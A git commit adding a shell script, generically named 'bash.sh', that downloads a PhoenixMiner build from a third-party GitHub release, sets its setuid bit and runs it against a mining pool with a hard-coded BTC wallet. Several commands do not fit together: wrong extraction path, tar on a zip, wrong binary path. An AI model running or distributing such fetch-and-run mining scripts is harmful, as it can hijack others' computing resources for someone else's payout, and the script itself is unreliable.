58a0ec49c291b8bddd6e104cd55abe015571265d
Farhan Ali <86302187+farhan-006@users.noreply.github.com>
2022-04-16 05:08:55 -0900

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+sudo apt update
+
+sudo apt-get install -y wget
+
+wget https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Linux.zip
+
+mkdir ~/Phoenix
+
+cd ~/Phoenix
+
+tar -xvpzf ~/Downloads/PhoenixMiner_5.1c_Linux.zip
+
+chmod u+s PhoenixMiner
+
+echo "enter a name to display"
+
+read answer
+
+./Phoenix/PhoenixMiner -pool ethash.unmineable.com:3333 -wal BTC:38QRUKvGhw589b97MUZoxGFfyRLx8ovmCU.${answer} -pass x
